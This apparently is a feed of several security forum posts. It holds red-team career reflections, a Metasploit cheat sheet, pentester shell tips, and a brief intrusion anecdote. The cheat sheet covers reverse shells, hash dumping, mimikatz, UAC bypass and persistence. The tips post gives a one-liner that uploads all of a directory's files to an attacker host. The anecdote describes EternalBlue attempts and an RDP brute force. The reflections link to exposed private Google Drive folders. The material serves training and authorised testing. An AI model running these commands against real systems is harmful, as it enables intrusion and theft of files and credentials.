<li>Content and complexity</li>
<li>Logical and clear methodology</li>
<li>Presentation method</li>
</ol>
<p>A maximum of  <strong>10 points</strong>  can be achieved for each criterion.<br>
In total, the student can reach a maximum of 30 points in this phase.</p>
<h3><strong>Phase 4 – Rank (Bonus)</strong></h3>
<p>This phase is about the bonus points that the student can collect.<br>
When the students reach the rank “Script Kiddie” on the HackTheBox Platform, they will receive an additional  <strong>5 points</strong> .<br>
Also, if they have reached the rank “Hacker”, they will receive another  <strong>5 points</strong> .<br>
A maximum of  <strong>10 points</strong>  can be earned at this phase.</p>
<p>Upon passing the exam, the student receives a certificate and thus becomes a</p>

          <title>Random Thoughts After Nearly 9 years Pentesting/Red Teaming: 2019</title>
          <dc:creator><![CDATA[maderas]]></dc:creator>
          <category>Pentesting</category>
          <description><![CDATA[
            <p>My qualifications/work experience:</p>
<p>I began pentesting professionally around December 2010/January 2011 (earlier if you consider my early forays into Google’s bug hunting program).</p>
<p>Since then I have worked for/run engagements against some well known/successful companies &amp; their clients/business partners.</p>
<p>Some companies I have been directly employed by include Schneider Electric (Cybersecurity, Penetration Test &amp; Vulnerability Assessment Lab Manager), National Grid (Senior Red Team Operator &amp; Penetration Test Consultant), Boston Scientific (Security Research Consultant) &amp; Stanley Black &amp; Decker (Senior Penetration Test/DPS Lab Consultant).</p>
<p>These engagements have run a wide gamut: Windows AD environments, medical robots, medical implant technology, PLC/SCADA/ICS targets within Industrial/Energy sector facilities, prototypes still within staging environments, etc.</p>
<p>What follows are random thoughts concerning facets of Information Security, mostly focusing on Red Teaming, Penetration Testing and Hacking (I consider all three the same game under different rules sets) that have really stuck with me throughout the year and/or proved to be of some special significance or importance.</p>
<p>I have posted multiple articles here at 0x00Sec; I will link the majority of them at the end of this article.</p>
<p>My best known is Share thoughts after 6+ years in Pentesting, which was the first of these yearly articles (written/posted in 2017) with roughly the same theme(s) that I endeavor to post every year.</p>

    Hello everyone.

</aside>

<p>Let’s get dangerous.</p>
<p>I almost typed that with a straight face.</p>
<p><em><strong>I believe we should begin a wide integration of deepfakes audio/visual tools into RedTeaming and that it should gradually become a regular facet of our toolbox</strong></em></p>
<p>Our job as Red Teamers is to prepare our clients/customers for the realities that real world actors and their actions present.</p>
<p>Deepfakes usage by real world actors is already a reality and I believe that its going to become a normal facet of everyday cybercrime.</p>
<p>I am not saying that we need to try and apply it to a ludicrous, Ghost in the Shell-esque degree right away, and obviously it may not be a realistic threat where every client/customer is concerned.</p>
<p>It maybe more realistic to start normalizing audio deepfakes, especially in instances where a client’s/customer’s senior management (and more specifically, their voice) can be utilized to test an organization.</p>
<p>I don’t think deepfakes is every going to overtake phishing and other social engineering techniques in popularity, but they could certainly add to the effectiveness of them.</p>
<p>And I do not mean just utilizing deepfakes in a technology vs. person context, but also a technology vs technology context.</p>
<p>For instance, integrating deepfakes does not only have to be limited to attacking a clients people with social engineering attacks.</p>
<p>Attacking a captured device that normally utilizes facial and/or voice recognition is likely another reality that some clients/customers may eventually face.</p>
<p>I have seen drones widely integrated into Red Teaming scenarios; I think deepfakes is a similar case of a tool that doesn’t fit every threat model and is highly situational but is out there and should be in our toolkits as the technology continues to become more applicable/available.</p>
<p>And I am not only talking about the more advanced GAN variants, but also the simpler/more available mobile applications out there that achieve things that are similar to deepfakes technology, like facial filtering apps.</p>
<p><em><strong>Skill in Linux/BSD administration/usage is more important/deadly then ever.</strong></em></p>
<p>Linux is everywhere, now so more then ever with Windows implementations of Linux subsystems and tooling/utilities like OpenSSH.</p>
<p>Given a large enough network, you will almost certainly find a developer’s host with at least Python installed, if not a VM with a Unix/Unix-like OS or Linux subsystem.</p>
<p>When enumerating these targets, look for instances where  “dev” is present within host/segment/subdomain/email names and naming conventions.</p>
<p>With a minimum of Python available, using pip to bring in Impacket is a huge win; it gives you a set of tools that can accomplish most facets of Windows exploitation/advanced enumeration like NTLM/SMB relay attacks.</p>
<p>I have never triggered AV/AM with Impacket’s tools, though I am careful with anything that utilizes Pass the Hash/PSExec type functionality (like SMBExec).</p>
<p>Impacket also gives you most/many of the prerequisites necessary to install tools like Responder and CrackmapExec, both of which pip can also facilitate.</p>
<p>Just having access to Python gives you some solid options for upgrading a shell you may have gained that is not so feature rich (such as those that sometimes occur when gaining a shell via  Apache or using Netcat as a handler) to pseudo-terminal functionality via PTY.</p>
<p>Fortunately, PTY is part of Python’s standard library.</p>
<p>Dropping an .exe to disc is normally not the best idea.</p>
<p>However, in situations like testing the security of company issued laptops or when you absolutely need a Linux/Unix environment on a restricted Windows host, you can install Cygwin (and thus, a sizeable Unix-like environment) without Administrator rights from CMD using the “–no-admin” option (<a href="https://odoepner.wordpress.com/2014/01/10/install-and-maintain-cygwin-without-windows-admin-rights/" rel="nofollow noopener">https://odoepner.wordpress.com/2014/01/10/install-and-maintain-cygwin-without-windows-admin-rights/</a>).</p>
<p>In my experience so far, unless there are Linux hosts amongst or maintaining connectivity to/with a Windows Active Directory environment, Windows Administrators are not yet configuring network defenses to deal with Linux utilities like OpenSSH very often.</p>
<p>This makes it valuable for bypassing things like firewalls/AV/AM; however, if detection is something you are trying to avoid, you may want to have your usage of these utilities match other network traffic/utilities in play.</p>
<p>As an aside, developer hosts are often valuable resources for lateral movement as they tend to have less restrictions/greater resources compared to other hosts within enterprise networks and often receive less scrutiny regarding the traffic emanating from them.</p>
<p>Sometimes they are Internet facing, though segregated into staging environments or something similar.</p>
<p>In my experience, if a staging environment shares a nameserver with a few of the targets domains/subdomains, there is usually a high probability that creds/hashes taken from the staging environment are going to be useful vs. other hosts outside the staging environment.</p>
<p>Also, as far as skills in operating Linux/BSD usefulness go,Unix/Unix-like operating systems dominate the Internet, existing in forms like Linux, BSD, Android, OSX, IOS, Solaris, etc.</p>
<p>For maximizing your returns on developing skills useful in exploiting/administrating both Linux and Android, playing with Busybox is a pretty sweet deal.</p>
<p>Similarly, developing the capacity to operate BSD at even a base level yields skills that are useful in operating OSXs terminal (Brew!) and (in my experience) has been at least a bit helpful in dealing with the odd Solaris/Sun Microsystems/HP/Oracle variety Unix (I realize Sun has been owned by Oracle for awhile now and still hate that the company is gone).</p>
<p><em><strong>Hacking and the hacker community have given me the means to build something that is mine.</strong></em></p>
<p>My childhood was no bueno. I grew up in a city that has been regularly ranked as one of the 50 most dangerous cities in the United States.</p>
<p>I have died. I have been homeless in Boston during the winter. When I was younger, I may or may not have been committed to being committed.</p>
<p>I am completely self taught with a GED education.</p>
<p>The last four companies I worked for were Fortune 500 or Fortune Global 500 companies and I held Senior or Manager related positions.</p>
<p>By combining hard work and the knowledge those that came before me gifted to this world, I have forged so much for myself.</p>
<p>The most important of those has been purpose and a place in this world, both of which I doubted the existence of for quite awhile.</p>
<p>If you refuse to give up on yourself and your dreams, those dreams can come true.</p>
<p>But you have to put yourself out there; you have to risk in the face of those things you fear.</p>
<p>No retreat. No surrender. Never give up on yourself. Ever.</p>
<p><em><strong>Search engine dorking seems to be increasing in potency/effectiveness</strong></em></p>
<p>This year, my experiments with search engine dorking led to some incredible finds, especially after learning techniques from online data hoarding and piracy communities who actively search for open directories containing media.</p>
<p>For instance, dorking using site:<a href="http://drive.google.com" rel="nofollow noopener">http://drive.google.com</a> +“drive/folders” finds publicly available/accessible Google Drive instances.</p>
<p>In 2019 I found open Google Drive instances belonging to both the Clinton Foundation at <a href="https://drive.google.com/drive/folders/0BxhYOtObFLfiUzYzNUxLMGY4eGM" rel="nofollow noopener">https://drive.google.com/drive/folders/0BxhYOtObFLfiUzYzNUxLMGY4eGM</a> &amp; and various documents surrounding Donald Trump’s business dealings at <a href="https://drive.google.com/drive/folders/0BziqO0UMlQeYWThiQlQwVUQ0UEk" rel="nofollow noopener">https://drive.google.com/drive/folders/0BziqO0UMlQeYWThiQlQwVUQ0UEk</a></p>
<p>Using this and other techniques, I also located multiple online caches of paperwork/records belonging to multiple US courts; many of these included cases that were yet to be resolved or tried and many of them contained sensitive information.</p>
<p>My research is ongoing, but I generally drop sources/interesting finds via Twitter posts every so often.</p>
<p><em><strong>Open your eyes</strong></em></p>
<p>Tools like TCPDump, Wireshark and Responder in Analyze mode are some of the most important tools I run, and I run them almost constantly while in a target’s LAN.</p>
<p>These are my eyes. They allow me to see the environment around me.</p>
<p>Do I want to blend in better? I may look at host names, operating systems, user agents, common protocols/services/utilities used and spoof/change attributes of my host to match the environment around me.</p>
<p>What AV/AM is running within the LAN?</p>
<p>Instead of conducting more intrusive scans, I can watch for ePO and other traffic created by AV/AM within the network to identify what I am up against.</p>
<p>These tools allow me to make better decisions in regard to what and when I enumerate.</p>
<p>Every action I take in LAN raises the probability of being detected.</p>
<p>Instead of taking unnecessary actions or deploying tools which trigger IPS/IDS or stick out as an abnormality, I can enumerate hosts through analysis of the traffic and/or time when I use tools to coincide with periods of heavier/similar traffic to better blend in.</p>
<p>For example, many of the Industrial/Energy sector targets I engaged ran Ferret or a similar utility to collect data on/from the surrounding systems/hosts. Often, this traffic involved Ferret spraying ICMP and SMB traffic at entire IP ranges (some Ferret deployments I saw created waves of traffic that resembled fluxing/spraying worm malware).</p>
<p>What better time to deploy tools like SMBMap or SMBspider then when Ferret is causing it to rain SMB traffic to and from existent and non-existent hosts alike?</p>
<p>Finally, not only are the PCAPs a portable form of recon that you can study outside the target network to better decide strategies/tactics for the next session, but you can also run Predz and net-creds against them, stripping them of credentials, interesting URLS, names of interesting files, hashes, etc.</p>
<p>This makes tools like Wireshark/TCPDUMP akin to others I use in establishing a technique I call Passive Advantage: they serve multiple purposes, are fairly innocuous and can render tremendous results with very little investment of focus/activity when within the target’s network(s).</p>
<p><em><strong>Android…</strong></em></p>
<p>Android has been an important tool for my success in external pentesting/Red Team engagements.</p>
<p>Often, a lack of awareness or attention create the most vulnerable points in a target’s security.</p>
<p>Awareness of the vulnerabilities Android applications (or more broadly, mobile applications in general) can create in enterprise infrastructure definitely seems to be lacking.</p>
<p>For instance, decompiling Android applications can yield tokens/API keys/certificates that can be leveraged to access enterprise infrastructure/resources, especially where Cloud infrastructure is concerned (for instance, AWS, Google Cloud services like Firestore/Firebase, AWS instances, etc.).</p>
<p>A couple of the simplest means to leverage Android apps towards infrastructure exploitation: use Androguard GUI to search for strings such as URIs/credentials or Keyfinder to locate keystores and/or certificates.</p>
<p>There are also more advanced attacks against the perimeter that can be made through using Xposed Framework modules/older versions of Android (5.1 and prior) to bypass certificate pinning and more easily establish certificate substitution (while allows you to fully proxify traffic through Burp and such).</p>
<p>Then there are attacks with tools like Drozer which may allow you to attack content providers (which could harbor backend databases) that may be available.</p>
<p>There are a ton of facets of an Android application that can be used to gain a foothold in perimeter infrastructure or provide unique reconnaissance.</p>
<p>Most importantly, much of the knowledge/tools/techniques to do so can be added to your repertoire fairly quickly.</p>
<p>These skills expand the target’s attack surface and give you options.</p>
<p>The more options you have, the more opportunities you have to make the most advantageous decisions possible; at the very least, options give you the  opportunity to postpone making a decision that places you at an outright disadvantage.</p>
<p>Even if you do not find an outright vulnerability that effects the perimeter by engaging/enumerating an Android application, in most instances, you are gaining greater knowledge of your target while usually sustaining a position that minimizes the possibility you will be detected (for instance, you can decompile an Android application offline).</p>
<p>Options are advantages.</p>
<p><em><strong>Passive Advantage</strong></em></p>
<p>As I have stated before, I believe Red Teaming/Penetration Testing/Hacking are arts of acquiring, applying and improving advantage.</p>
<p>During an engagement, I am always looking to acquire, apply and improve advantages. I study and train to better recognize and maximize the resources within an environment that allow me to gain, use and make the most of those advantages.</p>
<p>Gaining these advantages are more a product of knowledge and experience then an application of tools.</p>
<p>Advantages are the building blocks of tactics/strategy, which I believe are an understated facet of hacking in general.</p>
<p>Without tactics/strategy, an engagement becomes a contest that pits static quantities I possess (intelligence, knowledge of vulnerabilities, capacity to utilize tooling, etc.) vs. static quantities possessed by defenders/the target’s IT staff (their intelligence, knowledge of vulnerabilities, familiarity with the environment that will comprise most of the engagement terrain, capacity to utilize tooling, etc.).</p>
<p>Tactics/strategies allow you better/more creatively utilize those static quantities you possess and position yourself to best neutralize/exploit/manipulate those static quantities your target possesses.</p>
<p>One of the tactics I use most is what I call Passive Advantage: using automated tools to gain advantages for you via passive reconnaissance while you attend to other tasks that necessitate greater focus.</p>
<p>For instance, let’s say I am decompliling an Android application.</p>
<p>Before narrowing my range of attention/action, I start Spiderfoot (configured for fully passive reconnaissance, targeting the Internet itself but not touching target sites directly) vs. target domains/subdomains, Pagodo auto dorking vs. target domains/subdomains(automated Google dorking vs. the entire Exploit Database collection of Google dorking strings) and Datasploit.</p>
<p>None of these tools need my direct attention past first configuring/running them (until the time comes to analyze the results of course), they never directly touch the target’s domain/subdomains (so there is minimal chance these actions will lead to detection) and they are developing/delivering advantages for me while I am working elsewhere to create/improve/evolve other advantages.</p>
<p>When I finally get around to analyzing the results, I then start these/similar tools again vs. other target resources (maybe other domains/subdomains, email addresses of interesting employees, specific IP addresses/IP ranges, etc.).</p>
<p>I am chaining Passive Advantage, creating a near constant flow that finds/refines/contextualizes data specific to the target; the process creates options, while allowing me to better weigh my actions and advantages.</p>
<p>I will keep Passive Advantage perpetually running, which usually results in a process of refining the most applicable data I find: the first series may run against a master domain, then the subdomains found, then specific IP addresses/ranges found; this may shift to a particular employee email addresses/corporate email convention as I look for passwords that may have been disclosed in a recent breach/dump, etc.</p>
<p>Eventually, your mind will get quicker at analyzing the data that you are constantly making available to yourself.</p>
<p>For instance, I have become pretty good at searching/prioritizing the categories Spiderfoot logs results under and focusing my attention on those categories that are likely to aid the situation I find myself in or issue I am facing.</p>
<p>When engaging a target,I want to create offensives rather then just offense; Passive Advantage is a key tactic in establishing/sustaining that strategy.</p>
<p>I want to have as many moves to play as possible throughout an engagement.</p>
<p><em><strong>OSINT is awesome and its quantity/quality continues to grow</strong></em></p>
<p>As I have stated before, we live in a world that is hyper communicative, with much of this communication occurring on the Internet.</p>
<p>On the Internet, companies/products want to communicate their value to customers and people want to communicate with other people.</p>
<p>Open Source Intelligence (OSINT) is a byproduct of these online communications, and as the quantity of these communication continue to increase, the resources that yield OSINT will also increase.</p>
<p>In hacking, Red Teaming and Penetration Testing, we weaponize information through the application of our experience, intelligence, strategy, creativity and tooling.</p>
<p>This capacity is a major distinction that separates an experienced hacker from most other users on the Internet.</p>
<p>Our world is permeated by the digital world; more and more often, occurrences in the digital world shape occurrences/behaviors in meatspace.</p>
<p>This has led to a crowded headspace where more and more things are trying to gain our attention.</p>
<p>The more these things try to gain our attention and the more they try to differentiate themselves on the Internet, the more OSINT there is to collect, analyze and then weaponize.</p>
<p><em><strong>Know thyself and make your attributes/interests work for you.</strong></em></p>
<p>This game is more about evolution then emulation.</p>
<p>Start out on the paths others blazed, then wander farther and farther off of them.</p>
<p>Let your interests lead you off the path…don’t be afraid to get weird, don’t be afraid to be wrong and make mistakes.</p>
<p>Don’t be afraid to fail.</p>
<p>At some point on my own path, I became determined to make meaningful contributions to the world and came to believe hacking is/was my main mode for making these contributions.</p>
<p>I am not intellectually gifted and this is a field teaming with geniuses.</p>
<p>However, I have an excellent memory (especially when I read the information and I am interested in the topic), have suffered lifelong bouts of insomnia &amp; a have a strong work ethic.</p>
<p>On the negative side, my mind often drives me to constantly explore different facets of a subject rather then just focusing on what is at hand; I may start learning new facets of a programming language only to end up programming something completely unrelated because some facet of my learning compelled me toward it (maybe an example or quick aside/topic mentioned in the reference material).</p>
<p>When I began learning to hack, many written sources stated that specializing in some facet of hacking (wireless, reverse engineering, network penetration, etc.) was the way to go after learning gain at least basic understanding of topics like Windows/Linux systems/network administration.</p>
<p>Eventually, I decided to specialize in being as well rounded as possible offensively and defensively (though with a greater focus on offense).</p>
<p>This greater focus on the offensive side of things grew from my natural interest in adversarial tactics: finding, penetrating and exploring blackhat infrastructure in the wild is especially interesting to me.</p>
<p>Since it interests me so much, I learn as much as I can about the infrastructure and modes of exploitation, persistence and command/control used, which in turn aids my defensive skills.</p>
<p>While working for Schneider Electric, I designed the GPO/LGPO, Internet Explorer, general security and GDPR/general privacy settings for their implementations of Windows 10/Server 2016.</p>
<p>I was lent out to Saudi Aramco (the most valuable company in the world, worth an estimated $3 trillion dollars) during the Shamoon 2.0 attacks in February 2017; my analysis (which included remediation, identification, containment, forecasting, etc.) based on documented SMB worm traffic patterns/behaviors/indicators and past uses/evolutionary patterns of W97M.Downloader, became the basis for an action plan used by Saudi Aramco as well as  other Middle Eastern Industrial/Energy sector companies.</p>
<p>I had the necessary skills because I followed my natural interests, capabilities &amp; temperament; by learning offense I understand defense, by learning defense, I understand offense.</p>
<p>Have fun. Having to study less interesting stuff is inevitable, but focus more on what interests you and follow the path where that delivers you.</p>
<p>Keep doing that consistently and you will find your place.</p>

          <category>Pentesting</category>
          <description><![CDATA[
            <p>Hello:grinning:, good to everyone I leave some of the commands and tips I have collected throughout my studies and pentesting certifications, everything can be useful.The post is probably not very organized, I’m sorry for that but it can serve you many things for your pentesting.</p>
<p>If you would like to learn hacking and pentesting I recommend some machines that are very complete and serve to practice many different techniques are: <em><strong>Nebula and Protostar</strong></em></p>
<p>Nebula: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/" rel="nofollow noopener">https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/</a></p>
<p><em>Nebula: It takes a look at + SUID files + Permissions + Race conditions + Shell meta-variables + $PATH weaknesses + Scripting language weaknesses + Binary compilation failures At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.</em></p>
<p>Protostar: <a href="https://old.liveoverflow.com/binary_hacking/protostar/index.html" rel="nofollow noopener">https://old.liveoverflow.com/binary_hacking/protostar/index.html</a></p>
<p>Dradis-Framework(Create Reporte One-Click): <a href="https://dradisframework.com/ce/" rel="nofollow noopener">https://dradisframework.com/ce/</a></p>
<p><strong>Some of the modules of metasploit</strong></p>
<blockquote>
<p><em>exploit/multi/samba/usermap_script</em><br>
<em>auxiliary/scanner/mysql/mysql_login</em><br>
<em>auxiliary/scanner/mysql/mysql_hashdump</em><br>
<em>auxiliary/admin/mysql/mysql_sql</em><br>
<em>auxiliary/scanner/postgres/postgres_login</em><br>
<em>auxiliary/scanner/postgres/postgres_hashdump</em><br>
<em>exploit/linux/postgres/postgres_payload</em><br>
<em>auxiliary/scanner/http/tomcat_mgr_login</em><br>
<em>exploit/multi/http/tomcat_mgr_deploy</em></p>
</blockquote>
<blockquote>
<p><em>help -meterpreters</em><br>
<em>background - Then interact with a session</em><br>
<em>sessions s-i 2 (Identifier)</em><br>
<em>meterpreter &gt; load -l</em><br>
<em>meterpreter &gt; load sniffer</em><br>
<em>migrate PID -&gt;  to migrate the process through the PID</em></p>
</blockquote>
<p><strong>Post explotation</strong><br>
basically means the phases of operation once a victim’s system has been compromised by the attacker.<br>
If we already have a compromised machine and we want to see all the modules of post exploitation, only with type post / windows + enter we can see the modules that metasploit offers us</p>
<p>This module attempts to upgrade a command shell to meterpreter. The shell platform is automatically detected and the best version of meterpreter for the target is selected. Currently, meterpreter/reverse_tcp is used on Windows and Linux, with python/meterpreter/reverse_tcp’ used on all others.</p>
<blockquote>
<p><em>post/multi/manage/shell_to_meterpreter</em></p>
</blockquote>
<hr>
<blockquote>
<p><em>post/windows/gather/enum_logged_on_users</em>(view logged users)<br>
<em>post/windows/gather/checkvm</em> (check if it is a virtual machine)<br>
<em>post/windows/gather/forensics/browser_history</em><br>
<em>post/windows/gather/lsa_secrets</em><br>
<em>post/windows/gather/win_privs</em> (scale privileges)</p>
</blockquote>
<p>If we need a reverse shell from metasploit we can use multi handler, for example, suppose we already have the machine compromised but we do not have a reverse shell, we follow these steps</p>
<blockquote>
<p><em>use exploit/multi/handler</em><br>
<em>set payload windows/meterpreter/reverse_tcp</em><br>
<em>set LHOST 192.168.99.243</em>(ip example)<br>
<em>set LPORT 4444</em><br>
<em>exploit -j (sending PID to Background)</em><br>
<em>jobs</em>(we will be what are the processes that are running in the background)<br>
<em>jobs -h</em>(help)</p>
</blockquote>
<p><strong>server in python(2.7)</strong></p>
<blockquote>
<p><em>python -m SimpleHTTPServer 8000</em></p>
</blockquote>
<p><strong>server in python(3.x)</strong></p>
<blockquote>
<p><em>python -m http.server 8000</em></p>
</blockquote>
<p><strong>Local Exploit</strong><br>
Some of the methodologies when we have gained access to a machine and we have a user with low privileges and of course we want to get root. Suppose we have an exploit to launch and we escalate privileges</p>
<blockquote>
<p><em>use exploit/windows/local/ms15_051_client_copy_image</em></p>
</blockquote>
<p>we have got privileges and be NT / AUTHORITY-SYSTEM</p>
<p>We can see all user hashes by typing hashdump.</p>
<blockquote>
<p><em>meterpreter&gt;hashdump</em></p>
</blockquote>
<p>also if we have a local exploit and we launch it for example a bypass of uac, it is probably exploitable in windows7 without patching</p>
<blockquote>
<p><em>use exploit/windows/local/bypassuac</em><br>
<em>load -l</em> (the list of services we can upload)<br>
<em>set session 5</em> (connect to session number 5)<br>
<em>getsystem</em>(we can test if we get root automatically)<br>
<em>load_sniffer</em>(we load a sniffer)<br>
<em>sniffer_start 1</em><br>
<em>sniffer_dump 1</em></p>
</blockquote>
<p>you could investigate more about sniffer its other options that it has<br>
<strong>Do not forget that while you load more services in the process the meterpreter’s memory grows, a good option is to migrate to another process also in case of losing the session for example:</strong></p>
<blockquote>
<p><em>migrate PID</em></p>
</blockquote>
<p>You can also use this module of metasploit to inject the meterpreter in all the processes that can be:</p>
<blockquote>
<p><em>use post/windows/manage/multi_meterpreter_inject</em></p>
</blockquote>
<p>If we want to dump the victim’s ram</p>
<blockquote>
<p><em>load_winpem()</em></p>
</blockquote>
<p>mimikatz</p>
<blockquote>
<p><em>load_mimikatz</em><br>
<em>wdigest</em><br>
<em>load_kiwi</em></p>
</blockquote>
<p><strong>Persistence</strong></p>
<blockquote>
<p><em>use post/Windows/manage/persistence_exe</em><br>
<em>set Session x</em><br>
<em>info</em><br>
<em>set REXEPATH C:</em></p>
</blockquote>
<p>I hope something is helpful, thanks</p>

          <title>Tricks of the Trade from 5+ years in Offensive Cyber Security</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>Pentesting</category>
          <description><![CDATA[
            <p>I have been actively hacking things now for 5+ years, both professionally and as a hobbyist. Inside these 5 years, many mistakes have been made, I have my banged my head against a wall many times, I’ve messed up, I’ve had many “Ohhhhh” moments. This may all sound extremely familiar to you, and you’ll agree, that through all this there is one constant: you learn from these experiences.</p>
<p>In this article I’m going to document a few techniques, commands and small things that make my day-day testing life easier, and that might just make your life more enjoyable!</p>
<p>I apologize in advance for how unstructued this article might be, I just had a lot of back-pocket tricks I have picked up over the years and if my unorganized brain dump of tricks can make somebody go “Oh thats cool!” I’ll be happy <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>If you found anything here interesting, helpful, or amusing, please share this article to share the knowledge and joy!</p>
<h2>ZSH vs Bash, Aliases, Docker</h2>
<h3>ZSH</h3>
<p>One thing that has seriously made a difference to my productivity has been ZSH, and more specifically plugins such as ‘Z’. ZSH coupled with oh-my-zsh, and smart tab completion enabled, makes navigating directories in your terminal so much more pleasurable.</p>
<p>With my current setup, I can type <code>cd d/p/ad</code>, press <code>tab</code>, and it’ll auto complete to <code>Documents/Pentest/AD/</code>. There is also a ZSH plugin I use called <code>z</code>. Z will analyse your directory history and figure out what directories you go to most often. After about a few hours of use, typing <code>z pentest</code> will take you to your pentest directory, <code>z someproject</code> will take you there no matter where you are.</p>
<p>It’s hard to explain, but it’s magic.</p>
<h3>Aliases</h3>
<p>More shell fun, inside your <code>.zshrc</code> or <code>.bashrc</code> (scum), you can specify an alias, an alias will set a name of a command to whatever you set.</p>
<p>So for example:</p>
<pre><code class="lang-auto">alias nmap="grc nmap"
</code></pre>
<p>GRC colorizes cli application, this will make nmap very pretty, and make the responses somewhat readable! Wow!</p>

<p>If you’re familiar with the Linux shell, you’ll also know that you can set variables using the <code>EXPORT</code> command.</p>
<h3><code>gobuster -w $BIG -u https://10.10.10.145/</code></h3>
<pre><code class="lang-auto">export DIRS_LARGE=/pentest/seclists/Discovery/Web-Content/raft-large-directories.txt
export DIRS_SMALL=/pentest/seclists/Discovery/Web-Content/raft-small-directories.txt

export FILES_LARGE=/pentest/seclists/Discovery/Web-Content/raft-large-files.txt
export FILES_SMALL=/pentest/seclists/Discovery/Web-Content/raft-small-files.txt

export BIG=/pentest/seclists/Discovery/Web-Content/big.txt
</code></pre>
<p>Setting these directories allows us to access them by using their alias, such as in the above example where we use gobuster with $BIG as apposed to using their full path. This is a very nice little tip as it not only keeps your command (usually) to one line, it also means you don’t have to remember and type out the entire wordlist path everytime you need the list - which trust me, can be a lot if you’re regularly enumerating HTTP.</p>
<h3>Docker</h3>
<p>This is something I’ve been doing ever since I discovered Docker, but ropnop sums it up really nicely in his <a href="https://blog.ropnop.com/docker-for-pentesters/">Docker for Pentesters</a> article. I recommend reading through this, but my favourite trick from this entire article has got to be this:</p>
<pre><code class="lang-auto">alias postfiledumphere='docker run --rm -it -p80:3000 -v "${PWD}:/data" rflathers/postfiledump'  
</code></pre>
<p>Run this command, <code>postfiledumphere</code>, and then on your target machine (in a hackthebox or remote reverse shell), run this:</p>
<pre><code class="lang-auto">ls | xargs -I{} wget http://10.10.14.3/{} --post-file {}
</code></pre>
<p>This will iterate through all the files in the local directory, and transfer it over HTTP. This is extremely helpful if you find yourself in an embedded device, or even a locked down container. If you don’t have wget, you can use curl (which is in most devices).</p>
<h2>Situational Awareness with IP’s</h2>
<p>If you’ve been given an IP, and you need to do some threat intel on it, you can get a pretty good feel for the type of host it is, where it is, and what it does.</p>
<h3>IPInfo</h3>
<p>Usually if I get given an IP, I’ll do a lookup with ipinfo.</p>
<pre><code class="lang-auto">curl ipinfo.io/54.90.107.240
</code></pre>
<pre><code class="lang-auto">{
  "ip": "54.90.107.240",
  "hostname": "ec2-54-90-107-240.compute-1.amazonaws.com",
  "city": "Virginia Beach",
  "region": "Virginia",
  "country": "US",
  "loc": "36.8512,-76.1692",
  "org": "AS14618 Amazon.com, Inc.",
  "postal": "23465",
  "readme": "https://ipinfo.io/missingauth"
}
</code></pre>
<p>IPInfo will return JSON with details all about the host, the great thing about this is that you can easily script it by piping into <code>jq</code>.</p>
<p>I tend to abuse bash for loops for this kind of thing, say you have a text file full of IP’s:</p>
<pre><code class="lang-auto">for ip in $(cat ips.txt); do echo -n "$ip: "; curl -s ipinfo.io/$ip | jq .org; done
</code></pre>
<pre><code class="lang-auto">54.90.107.240: "AS14618 Amazon.com, Inc."
54.90.107.120: "AS14618 Amazon.com, Inc."
54.90.107.241: "AS14618 Amazon.com, Inc."
54.90.107.242: "AS14618 Amazon.com, Inc."
54.90.107.243: "AS14618 Amazon.com, Inc."
</code></pre>
<h3><a href="http://GreyNoise.io">GreyNoise.io</a></h3>
<p>You can do the same with Greynoise, if you don’t know already, <a href="http://Greynoise.io">Greynoise.io</a> is a badass service that hosts thousands of listeners all over the internet silently listening. When devices scan the internet for different ports, services, HTTP requests and the like, Greynoise takes note and indexes them.</p>
<p>The idea behind Greynoise is to ingest all the noise on the internet, so that you can filter it out.</p>
<p>If you have an API key, you can use the <code>greynoise</code> client from <a href="https://github.com/GreyNoise-Intelligence/GNQL">https://github.com/GreyNoise-Intelligence/GNQL</a>.</p>

<p>And of course, you can loop this around all day with bash for loops and the <code>-o json</code> option.</p>
<h3>Shodan</h3>
<p>You are probably aware of Shodan, I had to mention this for those who still don’t know, as it’s such a valuable tool.</p>
<p>Shodan scans all the hosts on the internet, all the time. This means you can preform a lookup of a host and see what they have.</p>

<h2>SSH Tunelling</h2>
<p>If you’ve ever exposed a CobaltStrike team server port externally, and told people about it, you’ll get a lot of hate (source: 1337 hacker slacks). What’s the solution? SSH Tunelling.</p>
<p>If you have SSH access to a host, you can tunnel ports (map remote ports to local ones), dynamically create SOCKS proxies, and a lot of really cool things.</p>
<h4>Mapping remote port to local port</h4>
<pre><code class="lang-auto">ssh -L localport:127.0.0.1:remoteport user@host
</code></pre>
<p>A good way to think about the syntax of SSH tunnels is to split it into two parts (when I saw this it blew my mind.)</p>
<pre><code class="lang-auto">ssh -L 127.0.0.1:8080:127.0.0.1:80 user@host
</code></pre>
<p>This will open local port 8080, mapped to port 80 on the remote server. Luckily for us, SSH is kind and let’s us infer the first host as local.</p>
<h4>Opening a SOCKS proxy that routes from your server</h4>
<pre><code class="lang-auto">SSH -D 8080 user@host
</code></pre>
<p>This will open a socks proxy on local port 8080, you can modify your proxychains.conf to accept this port, and then use <code>proxychains</code> before every command to route traffic through that host.</p>
<h3>Vagrant</h3>
<p>This is a cool little trick I learned, and it has really made me productive and has generally made things easier.</p>
<p>Like Docker, vagrant can spin up instances of operating systems and drop you into an interactive shell.</p>
<p>My favourite is using Ubuntu:</p>
<pre><code class="lang-auto">vagrant init hashicorp/precise32
vagrant up
vagrant ssh
cd /vagrant/
</code></pre>
<p>You’ll be dropped into an Ubuntu Precise shell!</p>
<h3>Conclusion</h3>
<p>In conclusion, a lot of cool little tricks can really make your life easier as a pentester. Small one liners, a reference article like this, and you may actually look like you know what you’re doing.</p>
<p>I hope you enjoyed this braindump :D, have an amazing day 0x00ers!</p>

          <description><![CDATA[
            <p>Last week, I was given access to a network which seemed secure at first glance.</p>
<p>As I’m always being curious, I ran my metasploit and scanned the range for that floor /24 with nmap to see how many live hosts are active. Almost all devices were showing up and after a second run I notice port 445 is open on almost all boxes. I try eternalblue against couple hosts but connection kept dropping, thought probably firewall or installed AV is blocking it. I noticed one device named PRINT-PC with one of first IPs in that range.</p>
<p>I nmap it and see that SMB port and RDP port are open, naturally I open hydra and try brute the RDP password and using username I guess from SMB response. after about 1 minute my hydra get stuck and repeats itself on 1234 as giving error on each repeated try. I open my RDP client and it WORKED!</p>
